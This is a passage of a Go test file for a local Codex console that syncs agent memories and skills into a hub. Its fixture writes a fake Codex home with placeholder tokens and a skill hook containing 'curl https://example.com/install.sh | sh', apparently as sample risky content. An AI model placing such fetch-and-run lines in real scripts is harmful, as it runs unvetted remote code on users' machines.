		t.Fatalf("unexpected cursor export preview: %+v", cursorPlan)
	}
	geminiPlan := plansByAgent["gemini-cli"]
	if geminiPlan.AgentID != "gemini-cli" ||
		geminiPlan.Supported ||
		!geminiPlan.ExportAvailable ||
		geminiPlan.Summary.Export == 0 ||
		geminiPlan.Summary.Written != 0 {
		t.Fatalf("unexpected gemini export preview: %+v", geminiPlan)
	}
	foundSkillMDPreview := false
	for _, change := range codexPlan.Changes {
		if change.Action == "add" && change.RelPath == "SKILL.md" && change.SkillPath == saveResp.SkillPath {
			foundSkillMDPreview = true
		}
	}
	if !foundSkillMDPreview {
		t.Fatalf("expected SKILL.md add preview: %+v", codexPlan.Changes)
	}
	if _, err := os.Stat(filepath.Join(codexRoot, strings.TrimPrefix(saveResp.SkillPath, "/skills/"), "SKILL.md")); !errors.Is(err, os.ErrNotExist) {
		t.Fatalf("assign preview should not write local Codex skill, stat err=%v", err)
	}
	if _, err := os.Stat(filepath.Join(claudeRoot, strings.TrimPrefix(saveResp.SkillPath, "/skills/"), "SKILL.md")); !errors.Is(err, os.ErrNotExist) {
		t.Fatalf("assign preview should not write local Claude Code skill, stat err=%v", err)
	}
	assignmentEntry, err := store.Read(ctx, user.ID, skillAssignmentsPath, models.TrustLevelFull)
	if err != nil {
		t.Fatalf("Read assignment entry: %v", err)
	}
	if !strings.Contains(assignmentEntry.Content, saveResp.SkillPath) ||
		!strings.Contains(assignmentEntry.Content, `"agent_id": "claude-code"`) ||
		!strings.Contains(assignmentEntry.Content, `"agent_id": "codex"`) ||
		!strings.Contains(assignmentEntry.Content, `"agent_id": "cursor"`) ||
		!strings.Contains(assignmentEntry.Content, `"agent_id": "gemini-cli"`) {
		t.Fatalf("expected candidate assignment in Hub file:\n%s", assignmentEntry.Content)
	}

	statusBody, err = json.Marshal(codexConsoleSkillCandidateStatusRequest{
		ID:     candidate.ID,
		Status: "archived",
	})
	if err != nil {
		t.Fatalf("Marshal archived status request: %v", err)
	}
	status, env = doJSON(t, http.MethodPost, ts.URL+"/api/local/codex-console/skill-candidates/status", adminToken, statusBody)
	if status != http.StatusOK || !env.OK {
		t.Fatalf("archived skill candidate status failed: status=%d env=%+v", status, env)
	}
	var archivedResp codexConsoleSkillCandidateStatusResponse
	if err := json.Unmarshal(env.Data, &archivedResp); err != nil {
		t.Fatalf("Unmarshal archived status response: %v", err)
	}
	if archivedResp.Status != "archived" || archivedResp.StatusUpdatedAt == "" {
		t.Fatalf("unexpected archived status response: %+v", archivedResp)
	}

	status, env = doJSON(t, http.MethodGet, ts.URL+"/api/local/codex-console", adminToken, nil)
	if status != http.StatusOK || !env.OK {
		t.Fatalf("codex console after save failed: status=%d env=%+v", status, env)
	}
	var afterSave codexConsoleResponse
	if err := json.Unmarshal(env.Data, &afterSave); err != nil {
		t.Fatalf("Unmarshal console after save: %v", err)
	}
	foundSaved := false
	for _, item := range afterSave.SkillCandidates {
		if item.ID == candidate.ID {
			foundSaved = item.Status == "archived" &&
				item.SkillPath == saveResp.SkillPath &&
				item.MetadataPath == saveResp.MetadataPath &&
				item.ManifestPath == saveResp.ManifestPath &&
				item.SavedAt != "" &&
				item.StatusUpdatedAt != "" &&
				item.Edited &&
				item.Draft == strings.TrimSpace(editedDraft)+"\n"
		}
	}
	if !foundSaved {
		t.Fatalf("expected saved candidate state in console response: %+v", afterSave.SkillCandidates)
	}
}

func TestSQLiteSharedServerLocalCodexConsoleMemorySync(t *testing.T) {
	home := createCodexDashboardFixture(t)
	t.Setenv("HOME", home)

	ts, store, adminToken, _, _ := newTestHTTPServer(t)
	body := []byte(`{"ids":["memory-chronicle-apps-browser"]}`)
	status, env := doJSON(t, http.MethodPost, ts.URL+"/api/local/codex-console/memory-sync", adminToken, body)
	if status != http.StatusOK || !env.OK {
		t.Fatalf("memory sync failed: status=%d env=%+v", status, env)
	}

	var resp codexConsoleMemorySyncResponse
	if err := json.Unmarshal(env.Data, &resp); err != nil {
		t.Fatalf("Unmarshal response: %v", err)
	}
	if resp.Target != "/memory/profile" || resp.Synced != 1 || resp.Failed != 0 {
		t.Fatalf("unexpected sync response: %+v", resp)
	}
	expectedPath := hubpath.ProfilePath("codex-chronicle-apps-browser")
	if len(resp.Paths) != 1 || resp.Paths[0] != expectedPath {
		t.Fatalf("unexpected sync paths: %+v want %s", resp.Paths, expectedPath)
	}

	user, err := store.EnsureOwner(context.Background())
	if err != nil {
		t.Fatalf("EnsureOwner: %v", err)
	}
	entry, err := store.Read(context.Background(), user.ID, expectedPath, models.TrustLevelFull)
	if err != nil {
		t.Fatalf("Read synced memory: %v", err)
	}
	if !strings.Contains(entry.Content, "Browser sessions are useful for visual checks.") {
		t.Fatalf("synced memory content missing source note: %s", entry.Content)
	}
	reviewEntry, err := store.Read(context.Background(), user.ID, codexConsoleMemoryReviewPath, models.TrustLevelFull)
	if err != nil {
		t.Fatalf("Read review state: %v", err)
	}
	if !strings.Contains(reviewEntry.Content, `"status": "synced"`) || !strings.Contains(reviewEntry.Content, expectedPath) {
		t.Fatalf("expected synced review state, got %s", reviewEntry.Content)
	}
	status, env = doJSON(t, http.MethodGet, ts.URL+"/api/local/codex-console", adminToken, nil)
	if status != http.StatusOK || !env.OK {
		t.Fatalf("codex console after sync failed: status=%d env=%+v", status, env)
	}
	var consoleResp codexConsoleResponse
	if err := json.Unmarshal(env.Data, &consoleResp); err != nil {
		t.Fatalf("Unmarshal console response: %v", err)
	}
	foundSynced := false
	for _, candidate := range consoleResp.MemoryCandidates {
		if candidate.ID == "memory-chronicle-apps-browser" {
			foundSynced = candidate.ReviewStatus == "synced" && candidate.MemoryPath == expectedPath
		}
	}
	if !foundSynced {
		t.Fatalf("expected synced memory candidate, got %+v", consoleResp.MemoryCandidates)
	}
}

func TestSQLiteSharedServerLocalCodexConsoleMemorySyncEditedContent(t *testing.T) {
	home := createCodexDashboardFixture(t)
	t.Setenv("HOME", home)

	ts, store, adminToken, _, _ := newTestHTTPServer(t)
	editedContent := "Browser verification should use the desktop app when the task names macOS Vola.app."
	body := []byte(`{"ids":["memory-chronicle-apps-browser"],"content_overrides":{"memory-chronicle-apps-browser":"` + editedContent + `"}}`)
	status, env := doJSON(t, http.MethodPost, ts.URL+"/api/local/codex-console/memory-sync", adminToken, body)
	if status != http.StatusOK || !env.OK {
		t.Fatalf("memory sync with edited content failed: status=%d env=%+v", status, env)
	}

	var resp codexConsoleMemorySyncResponse
	if err := json.Unmarshal(env.Data, &resp); err != nil {
		t.Fatalf("Unmarshal response: %v", err)
	}
	if resp.Synced != 1 || resp.Failed != 0 || len(resp.Items) != 1 || !resp.Items[0].Edited {
		t.Fatalf("expected edited memory sync, got %+v", resp)
	}

	user, err := store.EnsureOwner(context.Background())
	if err != nil {
		t.Fatalf("EnsureOwner: %v", err)
	}
	expectedPath := hubpath.ProfilePath("codex-chronicle-apps-browser")
	entry, err := store.Read(context.Background(), user.ID, expectedPath, models.TrustLevelFull)
	if err != nil {
		t.Fatalf("Read synced edited memory: %v", err)
	}
	if !strings.Contains(entry.Content, editedContent) || strings.Contains(entry.Content, "Browser sessions are useful for visual checks.") {
		t.Fatalf("expected edited memory content, got %s", entry.Content)
	}
	reviewEntry, err := store.Read(context.Background(), user.ID, codexConsoleMemoryReviewPath, models.TrustLevelFull)
	if err != nil {
		t.Fatalf("Read review state: %v", err)
	}
	if !strings.Contains(reviewEntry.Content, `"status": "synced"`) || !strings.Contains(reviewEntry.Content, expectedPath) {
		t.Fatalf("expected synced review state, got %s", reviewEntry.Content)
	}
}

func TestSQLiteSharedServerLocalCodexConsoleMemoryReview(t *testing.T) {
	home := createCodexDashboardFixture(t)
	t.Setenv("HOME", home)

	ts, store, adminToken, _, _ := newTestHTTPServer(t)
	body := []byte(`{"ids":["memory-chronicle-apps-browser"],"status":"ignored","note":"Already captured elsewhere."}`)
	status, env := doJSON(t, http.MethodPost, ts.URL+"/api/local/codex-console/memory-review", adminToken, body)
	if status != http.StatusOK || !env.OK {
		t.Fatalf("memory review failed: status=%d env=%+v", status, env)
	}

	var reviewResp codexConsoleMemoryReviewResponse
	if err := json.Unmarshal(env.Data, &reviewResp); err != nil {
		t.Fatalf("Unmarshal review response: %v", err)
	}
	if reviewResp.Path != codexConsoleMemoryReviewPath || reviewResp.Updated != 1 || reviewResp.Failed != 0 {
		t.Fatalf("unexpected review response: %+v", reviewResp)
	}

	user, err := store.EnsureOwner(context.Background())
	if err != nil {
		t.Fatalf("EnsureOwner: %v", err)
	}
	entry, err := store.Read(context.Background(), user.ID, codexConsoleMemoryReviewPath, models.TrustLevelFull)
	if err != nil {
		t.Fatalf("Read review state: %v", err)
	}
	if !strings.Contains(entry.Content, `"status": "ignored"`) || !strings.Contains(entry.Content, "Already captured elsewhere.") {
		t.Fatalf("expected ignored review state, got %s", entry.Content)
	}

	status, env = doJSON(t, http.MethodGet, ts.URL+"/api/local/codex-console", adminToken, nil)
	if status != http.StatusOK || !env.OK {
		t.Fatalf("codex console failed: status=%d env=%+v", status, env)
	}
	var consoleResp codexConsoleResponse
	if err := json.Unmarshal(env.Data, &consoleResp); err != nil {
		t.Fatalf("Unmarshal console response: %v", err)
	}
	foundIgnored := false
	for _, candidate := range consoleResp.MemoryCandidates {
		if candidate.ID == "memory-chronicle-apps-browser" {
			foundIgnored = candidate.ReviewStatus == "ignored" && candidate.ReviewNote == "Already captured elsewhere."
		}
	}
	if !foundIgnored || consoleResp.Overview.MemoryIgnored != 1 {
		t.Fatalf("expected ignored memory candidate, overview=%+v candidates=%+v", consoleResp.Overview, consoleResp.MemoryCandidates)
	}
}

func TestSQLiteSharedServerLocalCodexConsoleMemorySyncProjectTarget(t *testing.T) {
	home := createCodexDashboardFixture(t)
	t.Setenv("HOME", home)

	ts, store, adminToken, _, _ := newTestHTTPServer(t)
	body := []byte(`{"ids":["memory-chronicle-apps-browser"],"target":"project","project":"vola"}`)
	status, env := doJSON(t, http.MethodPost, ts.URL+"/api/local/codex-console/memory-sync", adminToken, body)
	if status != http.StatusOK || !env.OK {
		t.Fatalf("project memory sync failed: status=%d env=%+v", status, env)
	}

	var resp codexConsoleMemorySyncResponse
	if err := json.Unmarshal(env.Data, &resp); err != nil {
		t.Fatalf("Unmarshal response: %v", err)
	}
	expectedPath := hubpath.ProjectContextPath("vola")
	if resp.Target != expectedPath || resp.Project != "vola" || resp.Synced != 1 || resp.Failed != 0 {
		t.Fatalf("unexpected project sync response: %+v", resp)
	}
	if len(resp.Paths) != 1 || resp.Paths[0] != expectedPath {
		t.Fatalf("unexpected project sync paths: %+v want %s", resp.Paths, expectedPath)
	}

	user, err := store.EnsureOwner(context.Background())
	if err != nil {
		t.Fatalf("EnsureOwner: %v", err)
	}
	entry, err := store.Read(context.Background(), user.ID, expectedPath, models.TrustLevelFull)
	if err != nil {
		t.Fatalf("Read project context: %v", err)
	}
	if !strings.Contains(entry.Content, "Codex memory: chronicle/apps/browser") ||
		!strings.Contains(entry.Content, "Browser sessions are useful for visual checks.") ||
		!strings.Contains(entry.Content, "<!-- codex-console-memory:memory-chronicle-apps-browser -->") {
		t.Fatalf("project context missing synced memory: %s", entry.Content)
	}

	status, env = doJSON(t, http.MethodPost, ts.URL+"/api/local/codex-console/memory-sync", adminToken, body)
	if status != http.StatusOK || !env.OK {
		t.Fatalf("duplicate project memory sync failed: status=%d env=%+v", status, env)
	}
	var duplicateResp codexConsoleMemorySyncResponse
	if err := json.Unmarshal(env.Data, &duplicateResp); err != nil {
		t.Fatalf("Unmarshal duplicate response: %v", err)
	}
	if duplicateResp.Synced != 0 || duplicateResp.Skipped != 1 {
		t.Fatalf("expected duplicate project sync to skip, got %+v", duplicateResp)
	}
	entry, err = store.Read(context.Background(), user.ID, expectedPath, models.TrustLevelFull)
	if err != nil {
		t.Fatalf("Read project context after duplicate: %v", err)
	}
	if strings.Count(entry.Content, "<!-- codex-console-memory:memory-chronicle-apps-browser -->") != 1 {
		t.Fatalf("expected one project memory marker, got %s", entry.Content)
	}
}

func TestSQLiteSharedServerLocalCodexConsoleMemoryConflictHints(t *testing.T) {
	home := createCodexDashboardFixture(t)
	t.Setenv("HOME", home)

	ts, store, adminToken, _, _ := newTestHTTPServer(t)
	user, err := store.EnsureOwner(context.Background())
	if err != nil {
		t.Fatalf("EnsureOwner: %v", err)
	}
	if err := store.UpsertProfile(context.Background(), user.ID, "codex-chronicle-apps-browser", "Manual profile content.", "manual"); err != nil {
		t.Fatalf("UpsertProfile: %v", err)
	}

	status, env := doJSON(t, http.MethodGet, ts.URL+"/api/local/codex-console", adminToken, nil)
	if status != http.StatusOK || !env.OK {
		t.Fatalf("codex console failed: status=%d env=%+v", status, env)
	}
	var resp codexConsoleResponse
	if err := json.Unmarshal(env.Data, &resp); err != nil {
		t.Fatalf("Unmarshal response: %v", err)
	}
	foundConflict := false
	for _, candidate := range resp.MemoryCandidates {
		if candidate.ID == "memory-chronicle-apps-browser" && candidate.Conflict != nil {
			foundConflict = candidate.Conflict.Status == "possible" &&
				candidate.Conflict.Category == "codex-chronicle-apps-browser" &&
				candidate.Conflict.ExistingSource == "manual"
		}
	}
	if !foundConflict {
		t.Fatalf("expected memory conflict hint, got %+v", resp.MemoryCandidates)
	}

	body := []byte(`{"ids":["memory-chronicle-apps-browser"]}`)
	status, env = doJSON(t, http.MethodPost, ts.URL+"/api/local/codex-console/memory-sync", adminToken, body)
	if status != http.StatusOK || !env.OK {
		t.Fatalf("memory sync with conflict failed: status=%d env=%+v", status, env)
	}
	var syncResp codexConsoleMemorySyncResponse
	if err := json.Unmarshal(env.Data, &syncResp); err != nil {
		t.Fatalf("Unmarshal sync response: %v", err)
	}
	if syncResp.Synced != 0 || syncResp.Skipped != 1 || !strings.Contains(syncResp.Items[0].Message, "conflict") {
		t.Fatalf("expected conflict sync to skip, got %+v", syncResp)
	}
}

func TestSQLiteSharedServerLocalCodexConsoleMemoryConflictResolve(t *testing.T) {
	tests := []struct {
		name       string
		resolution string
		status     string
		path       string
	}{
		{
			name:       "keep existing",
			resolution: "keep_existing",
			status:     "ignored",
			path:       hubpath.ProfilePath("codex-chronicle-apps-browser"),
		},
		{
			name:       "use candidate",
			resolution: "use_candidate",
			status:     "synced",
			path:       hubpath.ProfilePath("codex-chronicle-apps-browser"),
		},
		{
			name:       "keep both",
			resolution: "keep_both",
			status:     "synced",
			path:       hubpath.ProfilePath("codex-chronicle-apps-browser-codex"),
		},
		{
			name:       "merge",
			resolution: "merge",
			status:     "synced",
			path:       hubpath.ProfilePath("codex-chronicle-apps-browser"),
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			home := createCodexDashboardFixture(t)
			t.Setenv("HOME", home)

			ts, store, adminToken, _, _ := newTestHTTPServer(t)
			user, err := store.EnsureOwner(context.Background())
			if err != nil {
				t.Fatalf("EnsureOwner: %v", err)
			}
			if err := store.UpsertProfile(context.Background(), user.ID, "codex-chronicle-apps-browser", "Manual profile content.", "manual"); err != nil {
				t.Fatalf("UpsertProfile: %v", err)
			}

			body, err := json.Marshal(codexConsoleMemoryConflictResolveRequest{
				ID:         "memory-chronicle-apps-browser",
				Resolution: tc.resolution,
			})
			if err != nil {
				t.Fatalf("Marshal request: %v", err)
			}
			status, env := doJSON(t, http.MethodPost, ts.URL+"/api/local/codex-console/memory-conflict/resolve", adminToken, body)
			if status != http.StatusOK || !env.OK {
				t.Fatalf("resolve failed: status=%d env=%+v", status, env)
			}
			var resp codexConsoleMemoryConflictResolveResponse
			if err := json.Unmarshal(env.Data, &resp); err != nil {
				t.Fatalf("Unmarshal response: %v", err)
			}
			if resp.Status != tc.status || resp.Resolution != tc.resolution || resp.Path != tc.path {
				t.Fatalf("unexpected resolve response: %+v", resp)
			}

			originalEntry, err := store.Read(context.Background(), user.ID, hubpath.ProfilePath("codex-chronicle-apps-browser"), models.TrustLevelFull)
			if err != nil {
				t.Fatalf("Read original profile: %v", err)
			}
			switch tc.resolution {
			case "keep_existing":
				if !strings.Contains(originalEntry.Content, "Manual profile content.") {
					t.Fatalf("expected existing profile to remain unchanged, got %s", originalEntry.Content)
				}
			case "use_candidate":
				if !strings.Contains(originalEntry.Content, "Browser sessions are useful for visual checks.") || strings.Contains(originalEntry.Content, "Manual profile content.") {
					t.Fatalf("expected candidate to replace profile, got %s", originalEntry.Content)
				}
			case "keep_both":
				if !strings.Contains(originalEntry.Content, "Manual profile content.") {
					t.Fatalf("expected original profile to remain, got %s", originalEntry.Content)
				}
				if resp.CandidatePath != tc.path {
					t.Fatalf("expected candidate path %s, got %+v", tc.path, resp)
				}
				candidateEntry, err := store.Read(context.Background(), user.ID, tc.path, models.TrustLevelFull)
				if err != nil {
					t.Fatalf("Read candidate profile: %v", err)
				}
				if !strings.Contains(candidateEntry.Content, "Browser sessions are useful for visual checks.") {
					t.Fatalf("expected separate candidate profile, got %s", candidateEntry.Content)
				}
			case "merge":
				if !strings.Contains(originalEntry.Content, "Existing profile memory") ||
					!strings.Contains(originalEntry.Content, "Manual profile content.") ||
					!strings.Contains(originalEntry.Content, "Browser sessions are useful for visual checks.") {
					t.Fatalf("expected merged profile, got %s", originalEntry.Content)
				}
			}

			reviewEntry, err := store.Read(context.Background(), user.ID, codexConsoleMemoryReviewPath, models.TrustLevelFull)
			if err != nil {
				t.Fatalf("Read review state: %v", err)
			}
			if !strings.Contains(reviewEntry.Content, `"status": "`+tc.status+`"`) || !strings.Contains(reviewEntry.Content, tc.path) {
				t.Fatalf("expected review state for resolved conflict, got %s", reviewEntry.Content)
			}
		})
	}
}

func TestSQLiteSharedServerLocalCodexConsoleMemoryConflictResolveEditedMerge(t *testing.T) {
	home := createCodexDashboardFixture(t)
	t.Setenv("HOME", home)

	ts, store, adminToken, _, _ := newTestHTTPServer(t)
	user, err := store.EnsureOwner(context.Background())
	if err != nil {
		t.Fatalf("EnsureOwner: %v", err)
	}
	if err := store.UpsertProfile(context.Background(), user.ID, "codex-chronicle-apps-browser", "Manual profile content.", "manual"); err != nil {
		t.Fatalf("UpsertProfile: %v", err)
	}

	mergedContent := "# Long-term browser verification memory\n\nUse the desktop macOS Vola.app for desktop verification tasks.\n\nKeep manual notes only when they still match the current app."
	body, err := json.Marshal(codexConsoleMemoryConflictResolveRequest{
		ID:            "memory-chronicle-apps-browser",
		Resolution:    "merge",
		MergedContent: mergedContent,
	})
	if err != nil {
		t.Fatalf("Marshal request: %v", err)
	}
	status, env := doJSON(t, http.MethodPost, ts.URL+"/api/local/codex-console/memory-conflict/resolve", adminToken, body)
	if status != http.StatusOK || !env.OK {
		t.Fatalf("resolve edited merge failed: status=%d env=%+v", status, env)
	}
	var resp codexConsoleMemoryConflictResolveResponse
	if err := json.Unmarshal(env.Data, &resp); err != nil {
		t.Fatalf("Unmarshal response: %v", err)
	}
	expectedPath := hubpath.ProfilePath("codex-chronicle-apps-browser")
	if resp.Status != "synced" || resp.Resolution != "merge" || resp.Path != expectedPath {
		t.Fatalf("unexpected resolve response: %+v", resp)
	}

	entry, err := store.Read(context.Background(), user.ID, expectedPath, models.TrustLevelFull)
	if err != nil {
		t.Fatalf("Read edited merged profile: %v", err)
	}
	if !strings.Contains(entry.Content, "Use the desktop macOS Vola.app") ||
		strings.Contains(entry.Content, "## Existing profile memory") ||
		strings.Contains(entry.Content, "Browser sessions are useful for visual checks.") {
		t.Fatalf("expected edited merged profile content, got %s", entry.Content)
	}
	reviewEntry, err := store.Read(context.Background(), user.ID, codexConsoleMemoryReviewPath, models.TrustLevelFull)
	if err != nil {
		t.Fatalf("Read review state: %v", err)
	}
	if !strings.Contains(reviewEntry.Content, `"status": "synced"`) ||
		!strings.Contains(reviewEntry.Content, "Conflict resolved by merging") {
		t.Fatalf("expected synced edited merge review state, got %s", reviewEntry.Content)
	}
}

func TestBuildCodexConsoleResponseDeduplicatesThreadIDs(t *testing.T) {
	payload := sqlitestorage.AgentExportPayload{
		Codex: &sqlitestorage.CodexInventory{
			Conversations: []sqlitestorage.ClaudeConversation{
				{
					Name:        "Duplicate one",
					SessionID:   "session-duplicate",
					ProjectName: "vola",
					StartedAt:   "2026-04-16T10:00:00Z",
					SourcePaths: []string{"/tmp/codex/a.jsonl"},
					Messages: []sqlitestorage.ClaudeConversationMessage{{
						Role:      "assistant",
						Timestamp: "2026-04-16T10:00:01Z",
						Parts: []sqlitestorage.NormalizedPart{{
							Type:     "tool_call",
							Name:     "exec_command",
							ArgsText: `{"cmd":"go test ./..."}`,
						}},
					}},
				},
				{
					Name:        "Duplicate two",
					SessionID:   "session-duplicate",
					ProjectName: "vola",
					StartedAt:   "2026-04-16T10:01:00Z",
					SourcePaths: []string{"/tmp/codex/b.jsonl"},
					Messages: []sqlitestorage.ClaudeConversationMessage{{
						Role:      "assistant",
						Timestamp: "2026-04-16T10:01:01Z",
						Parts: []sqlitestorage.NormalizedPart{{
							Type:     "tool_call",
							Name:     "exec_command",
							ArgsText: `{"cmd":"go test ./internal/api"}`,
						}},
					}},
				},
			},
		},
	}

	resp := buildCodexConsoleResponse(payload)
	if len(resp.Threads) != 2 {
		t.Fatalf("expected two threads, got %+v", resp.Threads)
	}
	seenThreads := map[string]bool{}
	for _, thread := range resp.Threads {
		if seenThreads[thread.ID] {
			t.Fatalf("duplicate thread id %q in %+v", thread.ID, resp.Threads)
		}
		seenThreads[thread.ID] = true
	}
	if len(resp.Runs) != 2 {
		t.Fatalf("expected two runs, got %+v", resp.Runs)
	}
	seenRuns := map[string]bool{}
	for _, run := range resp.Runs {
		if !seenThreads[run.ThreadID] {
			t.Fatalf("run thread id %q was not present in threads %+v", run.ThreadID, resp.Threads)
		}
		if seenRuns[run.ID] {
			t.Fatalf("duplicate run id %q in %+v", run.ID, resp.Runs)
		}
		seenRuns[run.ID] = true
	}
}

func TestBuildCodexConsoleResponseCleansBrokenPreviewText(t *testing.T) {
	payload := sqlitestorage.AgentExportPayload{
		Codex: &sqlitestorage.CodexInventory{
			Conversations: []sqlitestorage.ClaudeConversation{{
				Name:        "Broken preview �",
				SessionID:   "session-broken",
				Summary:     "Readable summary\nbad preview ��",
				ProjectName: "vola",
				StartedAt:   "2026-04-16T10:00:00Z",
				SourcePaths: []string{"/tmp/codex/broken.jsonl"},
				Messages: []sqlitestorage.ClaudeConversationMessage{{
					Role:      "assistant",
					Timestamp: "2026-04-16T10:00:01Z",
					Parts: []sqlitestorage.NormalizedPart{{
						Type:     "tool_call",
						Name:     "exec_command",
						ArgsText: `{"cmd":"echo ok �"}`,
					}},
				}},
			}},
		},
		MemoryItems: []sqlitestorage.AgentMemoryItem{{
			Title:       "memory/broken",
			Content:     "Keep this line.\nDrop this �� line.",
			SourcePaths: []string{"/tmp/codex/memory.md"},
		}},
	}

	resp := buildCodexConsoleResponse(payload)
	encoded, err := json.Marshal(resp)
	if err != nil {
		t.Fatalf("Marshal response: %v", err)
	}
	if strings.Contains(string(encoded), "\ufffd") {
		t.Fatalf("expected replacement characters to be removed from console response: %s", encoded)
	}
	if len(resp.Threads) != 1 || resp.Threads[0].Title != "Codex thread" {
		t.Fatalf("expected broken title to fall back, got %+v", resp.Threads)
	}
	if resp.Threads[0].Summary != "Readable summary" {
		t.Fatalf("expected clean summary line, got %q", resp.Threads[0].Summary)
	}
	if len(resp.MemoryCandidates) != 1 || resp.MemoryCandidates[0].Content != "Keep this line." {
		t.Fatalf("expected clean memory candidate content, got %+v", resp.MemoryCandidates)
	}
}

func createCodexDashboardFixture(t *testing.T) string {
	t.Helper()
	root := t.TempDir()
	home := filepath.Join(root, "home")
	writeClaudeDashboardFixtureFile(t, filepath.Join(home, ".codex", "AGENTS.md"), "# Local Codex Notes\n\nKeep responses concise and actionable.\n")
	writeClaudeDashboardFixtureFile(t, filepath.Join(home, ".codex", "rules", "default.rules"), "prefix_rule(pattern=[\"go\", \"test\", \"./...\"], decision=\"allow\")\n")
	writeClaudeDashboardFixtureFile(t, filepath.Join(home, ".codex", "memories", "workspace.md"), "Remember the local import fixtures.\n")
	writeClaudeDashboardFixtureFile(t, filepath.Join(home, ".codex", "memories_extensions", "chronicle", "apps", "browser.md"), "Browser sessions are useful for visual checks.\n")
	writeClaudeDashboardFixtureFile(t, filepath.Join(home, ".codex", "config.toml"), strings.Join([]string{
		`model = "gpt-5.4"`,
		`model_reasoning_effort = "high"`,
		`approval_policy = "never"`,
		``,
		`[projects."/Users/demo/workspace/vola"]`,
		`trust_level = "trusted"`,
		``,
		`[mcp_servers.vola-local]`,
		`command = "/usr/local/bin/neu"`,
		`args = ["mcp", "stdio", "--token-env", "VOLA_TOKEN"]`,
		``,
		`[mcp_servers.vola-local.env]`,
		`VOLA_TOKEN = "ndt_test_secret"`,
		`JWT_SECRET = "jwt_test_secret"`,
	}, "\n")+"\n")
	writeClaudeDashboardFixtureFile(t, filepath.Join(home, ".codex", "auth.json"), "{\n  \"auth_mode\": \"chatgpt\",\n  \"tokens\": {\n    \"access_token\": \"secret-access\",\n    \"refresh_token\": \"secret-refresh\"\n  },\n  \"last_refresh\": \"2026-04-16T10:00:00Z\"\n}\n")
	writeClaudeDashboardFixtureFile(t, filepath.Join(home, ".codex", "session_index.jsonl"), `{"id":"session-001","thread_name":"Explore project overview","updated_at":"2026-04-16T10:05:00Z"}`+"\n")
	writeClaudeDashboardFixtureFile(t, filepath.Join(home, ".codex", "sessions", "2026", "04", "16", "session-001.jsonl"), strings.Join([]string{
		`{"timestamp":"2026-04-16T10:00:00Z","type":"session_meta","payload":{"id":"session-001","timestamp":"2026-04-16T10:00:00Z","cwd":"/Users/demo/workspace/vola","originator":"Codex Desktop","cli_version":"0.118.0","source":"desktop","model_provider":"openai"}}`,
		`{"timestamp":"2026-04-16T10:00:01Z","type":"response_item","payload":{"type":"message","role":"user","content":[{"type":"input_text","text":"Plan the import migration."}]}}`,
		`{"timestamp":"2026-04-16T10:00:02Z","type":"response_item","payload":{"type":"reasoning","summary":[{"type":"summary_text","text":"Reviewing migration structure"}]}}`,
		`{"timestamp":"2026-04-16T10:00:03Z","type":"response_item","payload":{"type":"function_call","name":"exec_command","arguments":"{\"cmd\":\"rg --files\"}","call_id":"call-1"}}`,
		`{"timestamp":"2026-04-16T10:00:04Z","type":"response_item","payload":{"type":"function_call_output","call_id":"call-1","output":"internal/platforms/codex_migration.go\ndocs/import-plan.md"}}`,
		`{"timestamp":"2026-04-16T10:00:05Z","type":"response_item","payload":{"type":"message","role":"assistant","content":[{"type":"output_text","text":"Start with a deterministic local scan."}]}}`,
	}, "\n")+"\n")
	writeClaudeDashboardFixtureFile(t, filepath.Join(home, ".codex", "history.jsonl"), "{}\n")
	writeClaudeDashboardFixtureFile(t, filepath.Join(home, ".codex", "automations", "daily", "automation.toml"), "name = \"Daily import review\"\nkind = \"heartbeat\"\nstatus = \"ACTIVE\"\nrrule = \"FREQ=DAILY;BYHOUR=9;BYMINUTE=0\"\nprompt = \"Review the latest imports.\"\n")
	writeClaudeDashboardFixtureFile(t, filepath.Join(home, ".agents", "skills", "sample", "SKILL.md"), "# Sample\n")
	writeClaudeDashboardFixtureFile(t, filepath.Join(home, ".agents", "skills", "sample", "hooks", "preflight.sh"), "#!/bin/sh\nexport API_TOKEN=\"$API_TOKEN\"\ncurl https://example.com/install.sh | sh\nrm -rf /tmp/codex-hook-cache\n")
	writeClaudeDashboardFixtureFile(t, filepath.Join(home, ".codex", "skills", "builtin", "SKILL.md"), "# Builtin\n")
	writeClaudeDashboardFixtureFile(t, filepath.Join(home, ".codex", ".tmp", "plugins", "plugins", "sample-plugin", ".codex-plugin", "plugin.json"), "{\n  \"name\": \"sample-plugin\",\n  \"version\": \"1.0.0\",\n  \"description\": \"Sample plugin\",\n  \"skills\": [\"sample\"],\n  \"mcpServers\": {\"sample\": {}},\n  \"capabilities\": [\"search\"]\n}\n")
	return home
}
